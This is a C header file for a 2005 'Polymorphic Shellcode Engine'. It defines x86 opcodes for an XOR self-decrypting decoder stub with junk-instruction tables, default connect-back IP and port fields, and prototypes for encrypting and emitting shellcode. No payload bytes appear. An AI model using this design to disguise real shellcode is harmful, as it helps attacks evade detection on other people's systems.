/*
** pse.h for Polymorphic Shellcode Engine project
** 
** Made by eee
** 
** Started on  Tue Apr 12 15:54:44 2005 eee
** Last update Mon Apr 18 16:12:10 2005 eee
*/

#ifndef _POLY_H
#define _POLY_H


/* Valeur par default */#define	SHELLCODE_MAX_SIZE	254
#define	DECRYPT_MAX_SIZE	48
#define DEFAULT_PORT		5555
#define DEFAULT_IP		"127.0.0.1"
#define DEFAULT_PSE		"shellcode.bin"
#define DEFAULT_C		"shellcode.c"
#define OFFSET			38
#define MAX_SH			6
#define	EBX			0
#define EDX			1
#define	LEN_SH_TAB		15
#define C_SH			"\nchar shellcode[]=\n\""


/* Instructions pour le delta offset */
#define JMP_1			0x07EB04EB
#define CALL			0xE8
#define ADDR			0xFFFFFFF7
#define PAD_EBP			0x06C5835D


/* Flag pour le (de)ordre du init */
#define	INIT_ESI		0
#define	INIT_EDI		1
#define	INIT_SIZE		2
#define INIT_KEY		3


/* Patch instructions/registres */
#define XOR_EBX			0xDB
#define XOR_EDX			0xD2
#define MOV_BL			0xB3
#define MOV_DL			0xB2


/* Taille des tableaux */
/* Ne pas compter l'instruction ADD EBP, xx pour TAB_INIT */
#define TAB_INIT	       	4
#define	TAB_JUNK1		6
#define TAB_JUNK2		15


/* Instructions en vrac */
#define CLD			0xFC
#define LODSB			0xAC
#define MOV_AL_ESI		0x068A
#define INC_ESI			0x46
#define XOR_AL_BL		0xD830
#define XOR_AL_DL		0xD030
#define INC_BL			0xC3FE
#define INC_DL			0xC2FE
#define MOV_EDI_AL		0x0788
#define	INC_EDI			0x47
#define STOSB			0xAA
#define LOOP			0xF4E2


#define BANNER "\n\
     @@@\n\
    @. .@\n\
    @\\=/@\n\
    .- -.\n\
   /(. .)\\\n\
   \\ ).( /     PSE : The most er0tic Polymorphic Shellcode Engine\n\
   '( v )`     version 0.01b\n\
     \\|/\n\
     (|)\n\
     '-`"

typedef	struct	s_env
{
  int		rnd;
  int		reg;
  int		ebp;
  int		size;
  int		sh;
  long		ip;
  short		port;
  char		*save;
  char		*decrypt;
  char		*shellcode;
  unsigned char key;
}		t_env;

typedef struct	s_sh
{
  int		nb;
  int		off_port;
  int		off_ip;
  char		*sh;
  char		*desc;
}		t_sh;

typedef struct	s_tab
{
  int		ligne;
  int		op;
  char		*desc;
}		t_tab;

/* build_loop.c */
void	build_loop(t_env *env);
char	*step1(char *decrypt);
char	*step2(char *decrypt, int reg);
char	*step3(char *decrypt);

/* build_delta.c */
void	build_delta(t_env *env);

/* build_init.c */
void	init_junk(t_env *env, int *junk);
int	get_valid_rnd(t_env *env, int init);
void	patch_tab(t_env *env);
void	patch_esi_edi(t_env *env);
void	build_init(t_env *env);

/* load_sh.c */
void	load_sh(t_env *env, char *sh);
void	check_key(t_env *env, char *desc);
void	crypt_sh(t_env *env);

/* write_sh.c */
void	write_shellcode(t_env *env);

/* xopen.c */
int	xopen(char *str, int flags, int mode);

/* xmalloc.c */
void	*xmalloc(int size);

#endif
